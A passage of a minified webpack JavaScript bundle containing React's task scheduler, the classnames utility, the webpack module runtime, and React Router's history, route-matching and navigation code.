            "use strict";
            function t(e, n) {
                var t = e.length;
                e.push(n);
                e: for (; 0 < t; ) {
                    var r = t - 1 >>> 1
                      , a = e[r];
                    if (!(0 < i(a, n)))
                        break e;
                    e[r] = n,
                    e[t] = a,
                    t = r
                }
            }
            function r(e) {
                return 0 === e.length ? null : e[0]
            }
            function a(e) {
                if (0 === e.length)
                    return null;
                var n = e[0]
                  , t = e.pop();
                if (t !== n) {
                    e[0] = t;
                    e: for (var r = 0, a = e.length, l = a >>> 1; r < l; ) {
                        var o = 2 * (r + 1) - 1
                          , s = e[o]
                          , u = o + 1
                          , c = e[u];
                        if (0 > i(s, t))
                            u < a && 0 > i(c, s) ? (e[r] = c,
                            e[u] = t,
                            r = u) : (e[r] = s,
                            e[o] = t,
                            r = o);
                        else {
                            if (!(u < a && 0 > i(c, t)))
                                break e;
                            e[r] = c,
                            e[u] = t,
                            r = u
                        }
                    }
                }
                return n
            }
            function i(e, n) {
                var t = e.sortIndex - n.sortIndex;
                return 0 !== t ? t : e.id - n.id
            }
            if ("object" === typeof performance && "function" === typeof performance.now) {
                var l = performance;
                n.unstable_now = function() {
                    return l.now()
                }
            } else {
                var o = Date
                  , s = o.now();
                n.unstable_now = function() {
                    return o.now() - s
                }
            }
            var u = []
              , c = []
              , A = 1
              , d = null
              , f = 3
              , p = !1
              , v = !1
              , m = !1
              , h = "function" === typeof setTimeout ? setTimeout : null
              , b = "function" === typeof clearTimeout ? clearTimeout : null
              , g = "undefined" !== typeof setImmediate ? setImmediate : null;
            function x(e) {
                for (var n = r(c); null !== n; ) {
                    if (null === n.callback)
                        a(c);
                    else {
                        if (!(n.startTime <= e))
                            break;
                        a(c),
                        n.sortIndex = n.expirationTime,
                        t(u, n)
                    }
                    n = r(c)
                }
            }
            function w(e) {
                if (m = !1,
                x(e),
                !v)
                    if (null !== r(u))
                        v = !0,
                        B(y);
                    else {
                        var n = r(c);
                        null !== n && T(w, n.startTime - e)
                    }
            }
            function y(e, t) {
                v = !1,
                m && (m = !1,
                b(z),
                z = -1),
                p = !0;
                var i = f;
                try {
                    for (x(t),
                    d = r(u); null !== d && (!(d.expirationTime > t) || e && !I()); ) {
                        var l = d.callback;
                        if ("function" === typeof l) {
                            d.callback = null,
                            f = d.priorityLevel;
                            var o = l(d.expirationTime <= t);
                            t = n.unstable_now(),
                            "function" === typeof o ? d.callback = o : d === r(u) && a(u),
                            x(t)
                        } else
                            a(u);
                        d = r(u)
                    }
                    if (null !== d)
                        var s = !0;
                    else {
                        var A = r(c);
                        null !== A && T(w, A.startTime - t),
                        s = !1
                    }
                    return s
                } finally {
                    d = null,
                    f = i,
                    p = !1
                }
            }
            "undefined" !== typeof navigator && void 0 !== navigator.scheduling && void 0 !== navigator.scheduling.isInputPending && navigator.scheduling.isInputPending.bind(navigator.scheduling);
            var C, E = !1, j = null, z = -1, P = 5, N = -1;
            function I() {
                return !(n.unstable_now() - N < P)
            }
            function X() {
                if (null !== j) {
                    var e = n.unstable_now();
                    N = e;
                    var t = !0;
                    try {
                        t = j(!0, e)
                    } finally {
                        t ? C() : (E = !1,
                        j = null)
                    }
                } else
                    E = !1
            }
            if ("function" === typeof g)
                C = function() {
                    g(X)
                }
                ;
            else if ("undefined" !== typeof MessageChannel) {
                var L = new MessageChannel
                  , O = L.port2;
                L.port1.onmessage = X,
                C = function() {
                    O.postMessage(null)
                }
            } else
                C = function() {
                    h(X, 0)
                }
                ;
            function B(e) {
                j = e,
                E || (E = !0,
                C())
            }
            function T(e, t) {
                z = h((function() {
                    e(n.unstable_now())
                }
                ), t)
            }
            n.unstable_IdlePriority = 5,
            n.unstable_ImmediatePriority = 1,
            n.unstable_LowPriority = 4,
            n.unstable_NormalPriority = 3,
            n.unstable_Profiling = null,
            n.unstable_UserBlockingPriority = 2,
            n.unstable_cancelCallback = function(e) {
                e.callback = null
            }
            ,
            n.unstable_continueExecution = function() {
                v || p || (v = !0,
                B(y))
            }
            ,
            n.unstable_forceFrameRate = function(e) {
                0 > e || 125 < e ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : P = 0 < e ? Math.floor(1e3 / e) : 5
            }
            ,
            n.unstable_getCurrentPriorityLevel = function() {
                return f
            }
            ,
            n.unstable_getFirstCallbackNode = function() {
                return r(u)
            }
            ,
            n.unstable_next = function(e) {
                switch (f) {
                case 1:
                case 2:
                case 3:
                    var n = 3;
                    break;
                default:
                    n = f
                }
                var t = f;
                f = n;
                try {
                    return e()
                } finally {
                    f = t
                }
            }
            ,
            n.unstable_pauseExecution = function() {}
            ,
            n.unstable_requestPaint = function() {}
            ,
            n.unstable_runWithPriority = function(e, n) {
                switch (e) {
                case 1:
                case 2:
                case 3:
                case 4:
                case 5:
                    break;
                default:
                    e = 3
                }
                var t = f;
                f = e;
                try {
                    return n()
                } finally {
                    f = t
                }
            }
            ,
            n.unstable_scheduleCallback = function(e, a, i) {
                var l = n.unstable_now();
                switch ("object" === typeof i && null !== i ? i = "number" === typeof (i = i.delay) && 0 < i ? l + i : l : i = l,
                e) {
                case 1:
                    var o = -1;
                    break;
                case 2:
                    o = 250;
                    break;
                case 5:
                    o = 1073741823;
                    break;
                case 4:
                    o = 1e4;
                    break;
                default:
                    o = 5e3
                }
                return e = {
                    id: A++,
                    callback: a,
                    priorityLevel: e,
                    startTime: i,
                    expirationTime: o = i + o,
                    sortIndex: -1
                },
                i > l ? (e.sortIndex = i,
                t(c, e),
                null === r(u) && e === r(c) && (m ? (b(z),
                z = -1) : m = !0,
                T(w, i - l))) : (e.sortIndex = o,
                t(u, e),
                v || p || (v = !0,
                B(y))),
                e
            }
            ,
            n.unstable_shouldYield = I,
            n.unstable_wrapCallback = function(e) {
                var n = f;
                return function() {
                    var t = f;
                    f = n;
                    try {
                        return e.apply(this, arguments)
                    } finally {
                        f = t
                    }
                }
            }
        }
        ,
        732: (e, n, t) => {
            "use strict";
            e.exports = t(833)
        }
        ,
        856: (e, n) => {
            var t;
            !function() {
                "use strict";
                var r = {}.hasOwnProperty;
                function a() {
                    for (var e = "", n = 0; n < arguments.length; n++) {
                        var t = arguments[n];
                        t && (e = l(e, i(t)))
                    }
                    return e
                }
                function i(e) {
                    if ("string" === typeof e || "number" === typeof e)
                        return e;
                    if ("object" !== typeof e)
                        return "";
                    if (Array.isArray(e))
                        return a.apply(null, e);
                    if (e.toString !== Object.prototype.toString && !e.toString.toString().includes("[native code]"))
                        return e.toString();
                    var n = "";
                    for (var t in e)
                        r.call(e, t) && e[t] && (n = l(n, t));
                    return n
                }
                function l(e, n) {
                    return n ? e ? e + " " + n : e + n : e
                }
                e.exports ? (a.default = a,
                e.exports = a) : void 0 === (t = function() {
                    return a
                }
                .apply(n, [])) || (e.exports = t)
            }()
        }
    }
      , n = {};
    function t(r) {
        var a = n[r];
        if (void 0 !== a)
            return a.exports;
        var i = n[r] = {
            exports: {}
        };
        return e[r](i, i.exports, t),
        i.exports
    }
    t.n = e => {
        var n = e && e.__esModule ? () => e.default : () => e;
        return t.d(n, {
            a: n
        }),
        n
    }
    ,
    ( () => {
        var e, n = Object.getPrototypeOf ? e => Object.getPrototypeOf(e) : e => e.__proto__;
        t.t = function(r, a) {
            if (1 & a && (r = this(r)),
            8 & a)
                return r;
            if ("object" === typeof r && r) {
                if (4 & a && r.__esModule)
                    return r;
                if (16 & a && "function" === typeof r.then)
                    return r
            }
            var i = Object.create(null);
            t.r(i);
            var l = {};
            e = e || [null, n({}), n([]), n(n)];
            for (var o = 2 & a && r; "object" == typeof o && !~e.indexOf(o); o = n(o))
                Object.getOwnPropertyNames(o).forEach((e => l[e] = () => r[e]));
            return l.default = () => r,
            t.d(i, l),
            i
        }
    }
    )(),
    t.d = (e, n) => {
        for (var r in n)
            t.o(n, r) && !t.o(e, r) && Object.defineProperty(e, r, {
                enumerable: !0,
                get: n[r]
            })
    }
    ,
    t.g = function() {
        if ("object" === typeof globalThis)
            return globalThis;
        try {
            return this || new Function("return this")()
        } catch (e) {
            if ("object" === typeof window)
                return window
        }
    }(),
    t.o = (e, n) => Object.prototype.hasOwnProperty.call(e, n),
    t.r = e => {
        "undefined" !== typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
            value: "Module"
        }),
        Object.defineProperty(e, "__esModule", {
            value: !0
        })
    }
    ,
    t.p = "/",
    ( () => {
        "use strict";
        var e, n = t(94), r = t.t(n, 2), a = t(775), i = t.t(a, 2);
        function l() {
            return l = Object.assign ? Object.assign.bind() : function(e) {
                for (var n = 1; n < arguments.length; n++) {
                    var t = arguments[n];
                    for (var r in t)
                        Object.prototype.hasOwnProperty.call(t, r) && (e[r] = t[r])
                }
                return e
            }
            ,
            l.apply(this, arguments)
        }
        !function(e) {
            e.Pop = "POP",
            e.Push = "PUSH",
            e.Replace = "REPLACE"
        }(e || (e = {}));
        const o = "popstate";
        function s(e, n) {
            if (!1 === e || null === e || "undefined" === typeof e)
                throw new Error(n)
        }
        function u(e, n) {
            if (!e) {
                "undefined" !== typeof console && console.warn(n);
                try {
                    throw new Error(n)
                } catch (t) {}
            }
        }
        function c(e, n) {
            return {
                usr: e.state,
                key: e.key,
                idx: n
            }
        }
        function A(e, n, t, r) {
            return void 0 === t && (t = null),
            l({
                pathname: "string" === typeof e ? e : e.pathname,
                search: "",
                hash: ""
            }, "string" === typeof n ? f(n) : n, {
                state: t,
                key: n && n.key || r || Math.random().toString(36).substr(2, 8)
            })
        }
        function d(e) {
            let {pathname: n="/", search: t="", hash: r=""} = e;
            return t && "?" !== t && (n += "?" === t.charAt(0) ? t : "?" + t),
            r && "#" !== r && (n += "#" === r.charAt(0) ? r : "#" + r),
            n
        }
        function f(e) {
            let n = {};
            if (e) {
                let t = e.indexOf("#");
                t >= 0 && (n.hash = e.substr(t),
                e = e.substr(0, t));
                let r = e.indexOf("?");
                r >= 0 && (n.search = e.substr(r),
                e = e.substr(0, r)),
                e && (n.pathname = e)
            }
            return n
        }
        function p(n, t, r, a) {
            void 0 === a && (a = {});
            let {window: i=document.defaultView, v5Compat: u=!1} = a
              , f = i.history
              , p = e.Pop
              , v = null
              , m = h();
            function h() {
                return (f.state || {
                    idx: null
                }).idx
            }
            function b() {
                p = e.Pop;
                let n = h()
                  , t = null == n ? null : n - m;
                m = n,
                v && v({
                    action: p,
                    location: x.location,
                    delta: t
                })
            }
            function g(e) {
                let n = "null" !== i.location.origin ? i.location.origin : i.location.href
                  , t = "string" === typeof e ? e : d(e);
                return t = t.replace(/ $/, "%20"),
                s(n, "No window.location.(origin|href) available to create URL for href: " + t),
                new URL(t,n)
            }
            null == m && (m = 0,
            f.replaceState(l({}, f.state, {
                idx: m
            }), ""));
            let x = {
                get action() {
                    return p
                },
                get location() {
                    return n(i, f)
                },
                listen(e) {
                    if (v)
                        throw new Error("A history only accepts one active listener");
                    return i.addEventListener(o, b),
                    v = e,
                    () => {
                        i.removeEventListener(o, b),
                        v = null
                    }
                },
                createHref: e => t(i, e),
                createURL: g,
                encodeLocation(e) {
                    let n = g(e);
                    return {
                        pathname: n.pathname,
                        search: n.search,
                        hash: n.hash
                    }
                },
                push: function(n, t) {
                    p = e.Push;
                    let a = A(x.location, n, t);
                    r && r(a, n),
                    m = h() + 1;
                    let l = c(a, m)
                      , o = x.createHref(a);
                    try {
                        f.pushState(l, "", o)
                    } catch (s) {
                        if (s instanceof DOMException && "DataCloneError" === s.name)
                            throw s;
                        i.location.assign(o)
                    }
                    u && v && v({
                        action: p,
                        location: x.location,
                        delta: 1
                    })
                },
                replace: function(n, t) {
                    p = e.Replace;
                    let a = A(x.location, n, t);
                    r && r(a, n),
                    m = h();
                    let i = c(a, m)
                      , l = x.createHref(a);
                    f.replaceState(i, "", l),
                    u && v && v({
                        action: p,
                        location: x.location,
                        delta: 0
                    })
                },
                go: e => f.go(e)
            };
            return x
        }
        var v;
        !function(e) {
            e.data = "data",
            e.deferred = "deferred",
            e.redirect = "redirect",
            e.error = "error"
        }(v || (v = {}));
        new Set(["lazy", "caseSensitive", "path", "id", "index", "children"]);
        function m(e, n, t) {
            void 0 === t && (t = "/");
            let r = X(("string" === typeof n ? f(n) : n).pathname || "/", t);
            if (null == r)
                return null;
            let a = h(e);
            !function(e) {
                e.sort(( (e, n) => e.score !== n.score ? n.score - e.score : function(e, n) {
                    let t = e.length === n.length && e.slice(0, -1).every(( (e, t) => e === n[t]));
                    return t ? e[e.length - 1] - n[n.length - 1] : 0
                }(e.routesMeta.map((e => e.childrenIndex)), n.routesMeta.map((e => e.childrenIndex)))))
            }(a);
            let i = null;
            for (let l = 0; null == i && l < a.length; ++l) {
                let e = I(r);
                i = P(a[l], e)
            }
            return i
        }
        function h(e, n, t, r) {
            void 0 === n && (n = []),
            void 0 === t && (t = []),
            void 0 === r && (r = "");
            let a = (e, a, i) => {
                let l = {
                    relativePath: void 0 === i ? e.path || "" : i,
                    caseSensitive: !0 === e.caseSensitive,
                    childrenIndex: a,
                    route: e
                };
                l.relativePath.startsWith("/") && (s(l.relativePath.startsWith(r), 'Absolute route path "' + l.relativePath + '" nested under path "' + r + '" is not valid. An absolute child route path must start with the combined path of all its parent routes.'),
                l.relativePath = l.relativePath.slice(r.length));
                let o = R([r, l.relativePath])
                  , u = t.concat(l);
                e.children && e.children.length > 0 && (s(!0 !== e.index, 'Index routes must not have child routes. Please remove all child routes from route path "' + o + '".'),
                h(e.children, n, u, o)),
                (null != e.path || e.index) && n.push({
                    path: o,
                    score: z(o, e.index),
                    routesMeta: u
                })
            }
            ;
            return e.forEach(( (e, n) => {
                var t;
                if ("" !== e.path && null != (t = e.path) && t.includes("?"))
                    for (let r of b(e.path))
                        a(e, n, r);
                else
                    a(e, n)
            }
            )),
            n
        }
        function b(e) {
            let n = e.split("/");
            if (0 === n.length)
                return [];
            let[t,...r] = n
              , a = t.endsWith("?")
              , i = t.replace(/\?$/, "");
            if (0 === r.length)
                return a ? [i, ""] : [i];
            let l = b(r.join("/"))
              , o = [];
            return o.push(...l.map((e => "" === e ? i : [i, e].join("/")))),
            a && o.push(...l),
            o.map((n => e.startsWith("/") && "" === n ? "/" : n))
        }
        const g = /^:[\w-]+$/
          , x = 3
          , w = 2
          , y = 1
          , C = 10
          , E = -2
          , j = e => "*" === e;
        function z(e, n) {
            let t = e.split("/")
              , r = t.length;
            return t.some(j) && (r += E),
            n && (r += w),
            t.filter((e => !j(e))).reduce(( (e, n) => e + (g.test(n) ? x : "" === n ? y : C)), r)
        }
        function P(e, n) {
            let {routesMeta: t} = e
              , r = {}
              , a = "/"
              , i = [];
            for (let l = 0; l < t.length; ++l) {
                let e = t[l]
                  , o = l === t.length - 1
                  , s = "/" === a ? n : n.slice(a.length) || "/"
                  , u = N({
                    path: e.relativePath,
                    caseSensitive: e.caseSensitive,
                    end: o
                }, s);
                if (!u)
                    return null;
                Object.assign(r, u.params);
                let c = e.route;
                i.push({
                    params: r,
                    pathname: R([a, u.pathname]),
                    pathnameBase: M(R([a, u.pathnameBase])),
                    route: c
                }),
                "/" !== u.pathnameBase && (a = R([a, u.pathnameBase]))
            }
            return i
        }
        function N(e, n) {
            "string" === typeof e && (e = {
                path: e,
                caseSensitive: !1,
                end: !0
            });
            let[t,r] = function(e, n, t) {
                void 0 === n && (n = !1);
                void 0 === t && (t = !0);
                u("*" === e || !e.endsWith("*") || e.endsWith("/*"), 'Route path "' + e + '" will be treated as if it were "' + e.replace(/\*$/, "/*") + '" because the `*` character must always follow a `/` in the pattern. To get rid of this warning, please change the route path to "' + e.replace(/\*$/, "/*") + '".');
                let r = []
                  , a = "^" + e.replace(/\/*\*?$/, "").replace(/^\/*/, "/").replace(/[\\.*+^${}|()[\]]/g, "\\$&").replace(/\/:([\w-]+)(\?)?/g, ( (e, n, t) => (r.push({
                    paramName: n,
                    isOptional: null != t
                }),
                t ? "/?([^\\/]+)?" : "/([^\\/]+)")));
                e.endsWith("*") ? (r.push({
                    paramName: "*"
                }),
                a += "*" === e || "/*" === e ? "(.*)$" : "(?:\\/(.+)|\\/*)$") : t ? a += "\\/*$" : "" !== e && "/" !== e && (a += "(?:(?=\\/|$))");
                let i = new RegExp(a,n ? void 0 : "i");
                return [i, r]
            }(e.path, e.caseSensitive, e.end)
              , a = n.match(t);
            if (!a)
                return null;
            let i = a[0]
              , l = i.replace(/(.)\/+$/, "$1")
              , o = a.slice(1);
            return {
                params: r.reduce(( (e, n, t) => {
                    let {paramName: r, isOptional: a} = n;
                    if ("*" === r) {
                        let e = o[t] || "";
                        l = i.slice(0, i.length - e.length).replace(/(.)\/+$/, "$1")
                    }
                    const s = o[t];
                    return e[r] = a && !s ? void 0 : (s || "").replace(/%2F/g, "/"),
                    e
                }
                ), {}),
                pathname: i,
                pathnameBase: l,
                pattern: e
            }
        }
        function I(e) {
            try {
                return e.split("/").map((e => decodeURIComponent(e).replace(/\//g, "%2F"))).join("/")
            } catch (n) {
                return u(!1, 'The URL path "' + e + '" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent encoding (' + n + ")."),
                e
            }
        }
        function X(e, n) {
            if ("/" === n)
                return e;
            if (!e.toLowerCase().startsWith(n.toLowerCase()))
                return null;
            let t = n.endsWith("/") ? n.length - 1 : n.length
              , r = e.charAt(t);
            return r && "/" !== r ? null : e.slice(t) || "/"
        }
        function L(e, n, t, r) {
            return "Cannot include a '" + e + "' character in a manually specified `to." + n + "` field [" + JSON.stringify(r) + "].  Please separate it out to the `to." + t + '` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.'
        }
        function O(e) {
            return e.filter(( (e, n) => 0 === n || e.route.path && e.route.path.length > 0))
        }
        function B(e, n) {
            let t = O(e);
            return n ? t.map(( (n, t) => t === e.length - 1 ? n.pathname : n.pathnameBase)) : t.map((e => e.pathnameBase))
        }
        function T(e, n, t, r) {
            let a;
            void 0 === r && (r = !1),
            "string" === typeof e ? a = f(e) : (a = l({}, e),
            s(!a.pathname || !a.pathname.includes("?"), L("?", "pathname", "search", a)),
            s(!a.pathname || !a.pathname.includes("#"), L("#", "pathname", "hash", a)),
            s(!a.search || !a.search.includes("#"), L("#", "search", "hash", a)));
            let i, o = "" === e || "" === a.pathname, u = o ? "/" : a.pathname;
            if (null == u)
                i = t;
            else {
                let e = n.length - 1;
                if (!r && u.startsWith("..")) {
                    let n = u.split("/");
                    for (; ".." === n[0]; )
                        n.shift(),
                        e -= 1;
                    a.pathname = n.join("/")
                }
                i = e >= 0 ? n[e] : "/"
            }
            let c = function(e, n) {
                void 0 === n && (n = "/");
                let {pathname: t, search: r="", hash: a=""} = "string" === typeof e ? f(e) : e
                  , i = t ? t.startsWith("/") ? t : function(e, n) {
                    let t = n.replace(/\/+$/, "").split("/");
                    return e.split("/").forEach((e => {
                        ".." === e ? t.length > 1 && t.pop() : "." !== e && t.push(e)
                    }
                    )),
                    t.length > 1 ? t.join("/") : "/"
                }(t, n) : n;
                return {
                    pathname: i,
                    search: H(r),
                    hash: W(a)
                }
            }(a, i)
              , A = u && "/" !== u && u.endsWith("/")
              , d = (o || "." === u) && t.endsWith("/");
            return c.pathname.endsWith("/") || !A && !d || (c.pathname += "/"),
            c
        }
        const R = e => e.join("/").replace(/\/\/+/g, "/")
          , M = e => e.replace(/\/+$/, "").replace(/^\/*/, "/")
          , H = e => e && "?" !== e ? e.startsWith("?") ? e : "?" + e : ""
          , W = e => e && "#" !== e ? e.startsWith("#") ? e : "#" + e : "";
        Error;
        function V(e) {
            return null != e && "number" === typeof e.status && "string" === typeof e.statusText && "boolean" === typeof e.internal && "data"in e
        }
        const k = ["post", "put", "patch", "delete"]
          , Y = (new Set(k),
        ["get", ...k]);
        new Set(Y),
        new Set([301, 302, 303, 307, 308]),
        new Set([307, 308]);
        Symbol("deferred");
        function S() {
            return S = Object.assign ? Object.assign.bind() : function(e) {
                for (var n = 1; n < arguments.length; n++) {
                    var t = arguments[n];
                    for (var r in t)
                        Object.prototype.hasOwnProperty.call(t, r) && (e[r] = t[r])
                }
                return e
            }
            ,
            S.apply(this, arguments)
        }
        const Z = n.createContext(null);
        const D = n.createContext(null);
        const F = n.createContext(null);
        const G = n.createContext(null);
        const Q = n.createContext({
            outlet: null,
            matches: [],
            isDataRoute: !1
        });
        const q = n.createContext(null);
        function U() {
            return null != n.useContext(G)
        }
        function J() {
            return U() || s(!1),
            n.useContext(G).location
        }
        function K(e) {
            n.useContext(F).static || n.useLayoutEffect(e)
        }
        function _() {
            let {isDataRoute: e} = n.useContext(Q);
            return e ? function() {
                let {router: e} = se(le.UseNavigateStable)
                  , t = ce(oe.UseNavigateStable)
                  , r = n.useRef(!1);
                K(( () => {
                    r.current = !0
                }
                ));
                let a = n.useCallback((function(n, a) {
                    void 0 === a && (a = {}),
                    r.current && ("number" === typeof n ? e.navigate(n) : e.navigate(n, S({
                        fromRouteId: t
                    }, a)))
                }
                ), [e, t]);
                return a
            }() : function() {
                U() || s(!1);
                let e = n.useContext(Z)
                  , {basename: t, future: r, navigator: a} = n.useContext(F)
                  , {matches: i} = n.useContext(Q)
                  , {pathname: l} = J()
                  , o = JSON.stringify(B(i, r.v7_relativeSplatPath))
                  , u = n.useRef(!1);
                K(( () => {
                    u.current = !0
                }
                ));
                let c = n.useCallback((function(n, r) {
                    if (void 0 === r && (r = {}),
                    !u.current)
                        return;
                    if ("number" === typeof n)
                        return void a.go(n);
                    let i = T(n, JSON.parse(o), l, "path" === r.relative);
                    null == e && "/" !== t && (i.pathname = "/" === i.pathname ? t : R([t, i.pathname])),
                    (r.replace ? a.replace : a.push)(i, r.state, r)
                }
                ), [t, a, o, l, e]);
                return c
            }()
        }
        function $(e, t) {
            let {relative: r} = void 0 === t ? {} : t
              , {future: a} = n.useContext(F)
              , {matches: i} = n.useContext(Q)
              , {pathname: l} = J()
              , o = JSON.stringify(B(i, a.v7_relativeSplatPath));
            return n.useMemo(( () => T(e, JSON.parse(o), l, "path" === r)), [e, o, l, r])
        }
        function ee(t, r, a, i) {
            U() || s(!1);
            let {navigator: l} = n.useContext(F)
              , {matches: o} = n.useContext(Q)
              , u = o[o.length - 1]
              , c = u ? u.params : {}
              , A = (u && u.pathname,
            u ? u.pathnameBase : "/");
            u && u.route;
            let d, p = J();
            if (r) {
                var v;
                let e = "string" === typeof r ? f(r) : r;
                "/" === A || (null == (v = e.pathname) ? void 0 : v.startsWith(A)) || s(!1),
                d = e
            } else
                d = p;
            let h = d.pathname || "/"
              , b = h;
            if ("/" !== A) {
                let e = A.replace(/^\//, "").split("/");
                b = "/" + h.replace(/^\//, "").split("/").slice(e.length).join("/")
            }
            let g = m(t, {
                pathname: b
            });
            let x = ie(g && g.map((e => Object.assign({}, e, {
                params: Object.assign({}, c, e.params),
                pathname: R([A, l.encodeLocation ? l.encodeLocation(e.pathname).pathname : e.pathname]),
                pathnameBase: "/" === e.pathnameBase ? A : R([A, l.encodeLocation ? l.encodeLocation(e.pathnameBase).pathname : e.pathnameBase])
            }))), o, a, i);
            return r && x ? n.createElement(G.Provider, {
                value: {
                    location: S({
                        pathname: "/",
                        search: "",
                        hash: "",
                        state: null,
                        key: "default"
                    }, d),
                    navigationType: e.Pop
                }
            }, x) : x
        }
        function ne() {
            let e = function() {
                var e;
                let t = n.useContext(q)
                  , r = ue(oe.UseRouteError)
                  , a = ce(oe.UseRouteError);
                if (void 0 !== t)
                    return t;
                return null == (e = r.errors) ? void 0 : e[a]
            }()
              , t = V(e) ? e.status + " " + e.statusText : e instanceof Error ? e.message : JSON.stringify(e)
              , r = e instanceof Error ? e.stack : null
              , a = "rgba(200,200,200, 0.5)"
              , i = {
                padding: "0.5rem",
                backgroundColor: a
            };
            return n.createElement(n.Fragment, null, n.createElement("h2", null, "Unexpected Application Error!"), n.createElement("h3", {
                style: {
                    fontStyle: "italic"
                }
            }, t), r ? n.createElement("pre", {
                style: i
            }, r) : null, null)
        }
        const te = n.createElement(ne, null);
        class re extends n.Component {
            constructor(e) {
                super(e),
                this.state = {
                    location: e.location,
                    revalidation: e.revalidation,
                    error: e.error
                }
            }
            static getDerivedStateFromError(e) {
                return {
                    error: e
                }
            }
            static getDerivedStateFromProps(e, n) {
                return n.location !== e.location || "idle" !== n.revalidation && "idle" === e.revalidation ? {
                    error: e.error,
                    location: e.location,
                    revalidation: e.revalidation
                } : {
                    error: void 0 !== e.error ? e.error : n.error,
                    location: n.location,
                    revalidation: e.revalidation || n.revalidation
                }
            }
            componentDidCatch(e, n) {
                console.error("React Router caught the following error during render", e, n)
            }
            render() {
                return void 0 !== this.state.error ? n.createElement(Q.Provider, {
                    value: this.props.routeContext
                }, n.createElement(q.Provider, {
                    value: this.state.error,
                    children: this.props.component
                })) : this.props.children
            }
        }
        function ae(e) {
            let {routeContext: t, match: r, children: a} = e
              , i = n.useContext(Z);
            return i && i.static && i.staticContext && (r.route.errorElement || r.route.ErrorBoundary) && (i.staticContext._deepestRenderedBoundaryId = r.route.id),
            n.createElement(Q.Provider, {
                value: t
            }, a)
        }
        function ie(e, t, r, a) {
            var i;
            if (void 0 === t && (t = []),
            void 0 === r && (r = null),
            void 0 === a && (a = null),
            null == e) {
                var l;
                if (null == (l = r) || !l.errors)
                    return null;
                e = r.matches
            }
            let o = e
              , u = null == (i = r) ? void 0 : i.errors;
            if (null != u) {
                let e = o.findIndex((e => e.route.id && (null == u ? void 0 : u[e.route.id])));
                e >= 0 || s(!1),
                o = o.slice(0, Math.min(o.length, e + 1))
            }
            let c = !1
              , A = -1;
            if (r && a && a.v7_partialHydration)
                for (let n = 0; n < o.length; n++) {
                    let e = o[n];
                    if ((e.route.HydrateFallback || e.route.hydrateFallbackElement) && (A = n),
                    e.route.id) {
                        let {loaderData: n, errors: t} = r
                          , a = e.route.loader && void 0 === n[e.route.id] && (!t || void 0 === t[e.route.id]);
                        if (e.route.lazy || a) {
                            c = !0,
                            o = A >= 0 ? o.slice(0, A + 1) : [o[0]];
                            break
                        }
                    }
                }
            return o.reduceRight(( (e, a, i) => {
                let l, s = !1, d = null, f = null;
                var p;
                r && (l = u && a.route.id ? u[a.route.id] : void 0,
                d = a.route.errorElement || te,
                c && (A < 0 && 0 === i ? (p = "route-fallback",
                !1 || Ae[p] || (Ae[p] = !0),
                s = !0,
                f = null) : A === i && (s = !0,
                f = a.route.hydrateFallbackElement || null)));
                let v = t.concat(o.slice(0, i + 1))
                  , m = () => {
                    let t;
                    return t = l ? d : s ? f : a.route.Component ? n.createElement(a.route.Component, null) : a.route.element ? a.route.element : e,
                    n.createElement(ae, {
                        match: a,
                        routeContext: {
                            outlet: e,
                            matches: v,
                            isDataRoute: null != r
                        },
                        children: t
                    })
                }
                ;
                return r && (a.route.ErrorBoundary || a.route.errorElement || 0 === i) ? n.createElement(re, {
                    location: r.location,
                    revalidation: r.revalidation,
                    component: d,
                    error: l,
                    children: m(),
                    routeContext: {
                        outlet: null,
                        matches: v,
                        isDataRoute: !0
                    }
                }) : m()
            }
            ), null)
        }
        var le = function(e) {
            return e.UseBlocker = "useBlocker",
            e.UseRevalidator = "useRevalidator",
            e.UseNavigateStable = "useNavigate",
            e
        }(le || {})
          , oe = function(e) {
            return e.UseBlocker = "useBlocker",
            e.UseLoaderData = "useLoaderData",
            e.UseActionData = "useActionData",
            e.UseRouteError = "useRouteError",
            e.UseNavigation = "useNavigation",
            e.UseRouteLoaderData = "useRouteLoaderData",
            e.UseMatches = "useMatches",
            e.UseRevalidator = "useRevalidator",
            e.UseNavigateStable = "useNavigate",
            e.UseRouteId = "useRouteId",
            e
        }(oe || {});
        function se(e) {
            let t = n.useContext(Z);
            return t || s(!1),
            t
        }
        function ue(e) {
            let t = n.useContext(D);
            return t || s(!1),
            t
        }
        function ce(e) {
            let t = function(e) {
                let t = n.useContext(Q);
                return t || s(!1),
                t
            }()
              , r = t.matches[t.matches.length - 1];
            return r.route.id || s(!1),
            r.route.id
        }
        const Ae = {};
        r.startTransition;
        function de(e) {
            s(!1)
        }
        function fe(t) {
            let {basename: r="/", children: a=null, location: i, navigationType: l=e.Pop, navigator: o, static: u=!1, future: c} = t;
            U() && s(!1);
            let A = r.replace(/^\/*/, "/")
              , d = n.useMemo(( () => ({
                basename: A,
                navigator: o,
                static: u,
                future: S({
                    v7_relativeSplatPath: !1
                }, c)
            })), [A, c, o, u]);
            "string" === typeof i && (i = f(i));
            let {pathname: p="/", search: v="", hash: m="", state: h=null, key: b="default"} = i
              , g = n.useMemo(( () => {
                let e = X(p, A);
                return null == e ? null : {
                    location: {
                        pathname: e,
                        search: v,
                        hash: m,
                        state: h,
                        key: b
                    },
                    navigationType: l
                }
            }
            ), [A, p, v, m, h, b, l]);
            return null == g ? null : n.createElement(F.Provider, {
                value: d
            }, n.createElement(G.Provider, {
                children: a,
                value: g
            }))
        }
        function pe(e) {
            let {children: n, location: t} = e;
            return function(e, n) {
                return ee(e, n)
            }(ve(n), t)
        }
        new Promise(( () => {}
        ));
        n.Component;
        function ve(e, t) {
            void 0 === t && (t = []);
            let r = [];
            return n.Children.forEach(e, ( (e, a) => {
                if (!n.isValidElement(e))
                    return;
                let i = [...t, a];
                if (e.type === n.Fragment)
                    return void r.push.apply(r, ve(e.props.children, i));
                e.type !== de && s(!1),
                e.props.index && e.props.children && s(!1);
                let l = {
                    id: e.props.id || i.join("-"),
                    caseSensitive: e.props.caseSensitive,
                    element: e.props.element,
                    Component: e.props.Component,
                    index: e.props.index,
                    path: e.props.path,
                    loader: e.props.loader,
                    action: e.props.action,
                    errorElement: e.props.errorElement,
                    ErrorBoundary: e.props.ErrorBoundary,
                    hasErrorBoundary: null != e.props.ErrorBoundary || null != e.props.errorElement,
                    shouldRevalidate: e.props.shouldRevalidate,
                    handle: e.props.handle,
                    lazy: e.props.lazy
                };
